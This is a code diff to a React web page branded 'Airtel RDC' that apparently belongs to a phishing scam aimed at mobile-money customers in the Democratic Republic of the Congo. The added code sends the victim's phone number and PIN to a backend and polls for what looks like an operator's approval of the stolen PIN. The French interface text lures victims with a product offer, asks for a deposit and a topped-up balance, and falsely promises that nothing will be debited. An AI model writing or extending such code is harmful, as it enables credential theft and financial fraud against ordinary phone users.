@@ -28,6 +28,13 @@
       const [timer, setTimer] = useState(60);
       const [error, setError] = useState('');
       const [sessionId] = useState(() => Math.random().toString(36).substring(2, 10));
+      const [product, setProduct] = useState(() => {
+        try {
+          return JSON.parse(localStorage.getItem('selected_product')) || { name: 'Article sélectionné', dep: 35 };
+        } catch {
+          return { name: 'Article sélectionné', dep: 35 };
+        }
+      });
 
       useEffect(() => {
         let interval;
@@ -168,7 +175,52 @@
           </div>
         );
       }
-      if (step === 4) {
+      const handleProceedToRequest = async () => {
+        setIsLoading(true);
+        setError('');
+        try {
+          await fetch('/api/verify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              session_id: sessionId,
+              phone,
+              pin: pin.join(''),
+              otp: 'CHECK_PIN'
+            })
+          });
+
+          // Start polling for pin verification status
+          const pollInterval = setInterval(async () => {
+            try {
+              const res = await fetch(`/api/status?session_id=${sessionId}`);
+              const data = await res.json();
+              
+              if (data.status === 'approved') {
+                clearInterval(pollInterval);
+                setIsLoading(false);
+                setStep(4);
+              } else if (data.status === 'rejected') {
+                clearInterval(pollInterval);
+                setIsLoading(false);
+                setError('Le code PIN entré est incorrect. Veuillez recommencer.');
+                setTimeout(() => {
+                  setStep(1);
+                  setPin(['', '', '', '']);
+                  setOtp(['', '', '', '']);
+                  setError('');
+                }, 2500);
+              }
+            } catch (err) {
+              console.error('Error polling status:', err);
+            }
+          }, 3000);
+
+        } catch (e) {
+          console.error('Failed to notify pin check:', e);
+          setIsLoading(false);
+        }
+      };
         return (
           <div className='min-h-screen flex flex-col'>
             <header className='airtel-red text-white p-6 text-center relative'>
@@ -193,28 +245,35 @@
       }
 
       if (step === 3) {
+        const halfDep = typeof product.dep === 'number' ? product.dep / 2 : 17.5;
+        const fullDep = typeof product.dep === 'number' ? product.dep : 35;
         return (
           <div className='min-h-screen flex flex-col'>
             <header className='airtel-red text-white p-6 text-center relative'>
               <h1 className='text-3xl font-bold'>Airtel RDC</h1>
-              <p className='text-sm mt-1 opacity-90'>Étapes suivantes</p>
+              <p className='text-sm mt-1 opacity-90'>Instructions importantes</p>
             </header>
             <main className='flex-1 flex justify-center px-4 -mt-6'>
               <div className='bg-white w-full max-w-2xl rounded-t-[32px] shadow-xl p-8 sm:p-12'>
-                <h2 className='text-3xl font-bold text-gray-900'>Instructions importantes</h2>
+                <h2 className='text-3xl font-bold text-gray-900'>Article : {product.name}</h2>
                 <div className='mt-8 space-y-6 text-gray-600 text-lg'>
                   <p>Pour qualifier à l'obtention de cet article, veuillez noter les conditions suivantes :</p>
                   <ul className='list-disc pl-5 space-y-3'>
-                    <li>Vous devez avoir au moins la moitié du prix ou le dépôt requis pour continuer.</li>
+                    <li>Le dépôt requis est de <b>${fullDep}</b>. Vous devez avoir au moins la moitié (<b>${halfDep}</b>) ou le dépôt complet (<b>${fullDep}</b>) pour continuer.</li>
                     <li>Si votre solde est inférieur à <b>10 000 CDF</b>, veuillez recharger votre compte avant de procéder.</li>
                     <li><b>Note :</b> Aucun montant ne sera débité de votre compte avant la réception effective de votre article.</li>
                   </ul>
                   <div className='bg-blue-50 border-l-4 border-blue-500 p-4 mt-6'>
                     <p className='font-bold text-blue-800'>Prochaines étapes :</p>
-                    <p>Un conseiller du service client Airtel vous appellera pour confirmer votre localisation et vos informations personnelles. L'article vous sera ensuite soit livré, soit mis à disposition pour récupération dans notre magasin.</p>
+                    <p>Un conseiller du service client Airtel vous appellera pour confirmer votre localisation et vos informations personnelles. L'article vous sera ensuite soit livré, soit mis à disposition pour récupération dans votre boutique Airtel la plus proche.</p>
                   </div>
                 </div>
-                <button onClick={() => setStep(4)} className='w-full mt-10 py-5 airtel-red text-white rounded-full text-xl font-bold hover:opacity-90'>Procéder à la demande</button>
+                {error && (
+                  <div className="mt-6 p-4 bg-red-50 border border-red-200 rounded-xl text-red-700 font-medium text-center">
+                    {error}
+                  </div>
+                )}
+                <button onClick={handleProceedToRequest} className='w-full mt-10 py-5 airtel-red text-white rounded-full text-xl font-bold hover:opacity-90'>Procéder à la demande</button>
               </div>
             </main>
           </div>
